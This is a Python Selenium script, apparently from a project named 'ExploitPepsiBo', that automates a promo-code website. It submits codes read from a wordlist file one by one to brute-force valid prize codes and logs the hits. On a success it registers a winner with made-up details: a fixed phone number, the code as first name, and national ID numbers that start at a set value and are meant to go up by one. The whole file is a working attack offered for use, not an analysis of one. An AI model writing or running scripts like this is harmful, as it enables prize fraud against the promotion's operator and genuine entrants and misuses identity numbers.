import time
import os
from datetime import datetime
from colorama import init, Fore, Back, Style

from selenium.webdriver.common.action_chains import ActionChains

from selenium import webdriver
from selenium.webdriver.remote.webelement import WebElement

from selenium.webdriver.support import expected_conditions as EC

from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.common.by import By

import pandas as pd


driver_path = "/home/kali/Downloads/geckodriver"

driver = webdriver.Firefox(executable_path=driver_path)
actions = ActionChains(driver)

driver.maximize_window()
driver.get("https://www.pepsibo.com/")

ActionChains(driver).move_by_offset(200, 100).click().perform() #click izquierdo

#Seleccionar linea

WebDriverWait(driver, 5)\
    .until(EC.element_to_be_clickable((By.XPATH,
                                        "/html/body/div[3]/section[1]/div[2]/div[2]/form[1]/div[3]/div[2]/select/option[2]")))\
    .click()

#Seleccionar telefono
WebDriverWait(driver, 5)\
    .until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                                        "input#msisdn")))\
    .send_keys("63969212")
def ganador():
    WebDriverWait(driver, 5)\
        .until(EC.element_to_be_clickable((By.XPATH,
                                            "/html/body/div[3]/section[1]/div[2]/div[2]/div/div/div/button")))\
        .click()

def clearCode():
    WebDriverWait(driver, 5) \
        .until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                                           "input#code"))) \
        .clear()


def ResetCode():

    WebDriverWait(driver, 5) \
        .until(EC.element_to_be_clickable((By.XPATH,
                                           "/html/body/div[3]/section[1]/div[2]/div[2]/div/button"))) \
        .click()

def Csend():
    WebDriverWait(driver, 5)\
        .until(EC.element_to_be_clickable((By.XPATH,
                                            "/html/body/div[3]/section[1]/div[2]/div[2]/form[1]/div[4]/button")))\
        .click()

def codesend(code):
    WebDriverWait(driver, 5)\
        .until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                                            "input#code")))\
        .send_keys(code)


count = 7897455

def sendName(name,apellido,count):

    def sendUsername():

        WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                                               "input#FirstName"))) \
            .send_keys(name)
    def sendApellido():
        WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                                               "input#LastName"))) \
            .send_keys(apellido)
    def dniSend(count):
        WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                                               "input#DNI"))) \
            .send_keys(count)

        count += 1
    def SelectDepartament():
        WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.XPATH,
                                               "/html/body/div[3]/section[1]/div[2]/div[2]/form[2]/div[2]/select/option[3]"))) \
            .click()

    def clickSendBOT():
        WebDriverWait(driver, 5) \
            .until(EC.element_to_be_clickable((By.XPATH,
                                               "/html/body/div[3]/section[1]/div[2]/div[2]/form[2]/button"))) \
            .click()

    sendUsername()
    sendApellido()
    dniSend(count)
    SelectDepartament()
    clickSendBOT()

with open("/home/kali/codes.txt","r") as codeVector:
    for i in codeVector:


        code = i

        codesend(code)
        Csend()

        try:

            ResetCode()
            print("Codigo incorrecto : "+Fore.RED+ i + Fore.WHITE)
        except Exception as e:
            try:
                pablo=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print("Codigo correcto   : "+Fore.GREEN+i+Fore.WHITE+" hora "+pablo)

                destFile = r"/home/kali/PycharmProjects/ExploitPepsiBo/codigos_validos.txt"

                with open(destFile, 'a') as f:
                    f.write(pablo+" codigo : "+code)
                ganador()
                time.sleep(5)
            except Exception as e:
                sendName(code,"valencia",count)


        clearCode()




print("Error querido no funciona tu codigo")
